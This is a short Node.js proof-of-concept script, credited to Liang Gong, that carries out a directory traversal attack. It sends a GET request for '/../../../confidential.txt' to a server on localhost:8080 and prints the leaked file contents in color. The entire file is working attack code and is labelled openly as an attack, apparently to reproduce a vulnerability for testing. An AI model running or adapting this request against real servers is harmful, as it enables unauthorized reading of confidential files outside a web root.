/**
 * Author: Liang Gong
 */
(function() {
    var http = require('http');
    var colors = require('colors');
    var content;
    var url = 'http://localhost:8080/../../confidential.txt';

    console.log('\t[' + 'directory traversal attack'.green + ']: ' + url);

    var content = '';
    var options = {
        hostname: 'localhost',
        port: 8080,
        path: '/../../../confidential.txt',
        method: 'GET',
        headers: {
            'accept' : '*/*',
        }
    };

    http.get(options, (res) => {
        res.on('data', (chunk) => {
            content += chunk.toString('utf-8');
        });
        res.on('end', () => {
            console.log('\t[' + 'directory traversal request response'.green + ']: ' + content.toString('utf-8').red);
        });
    });
})();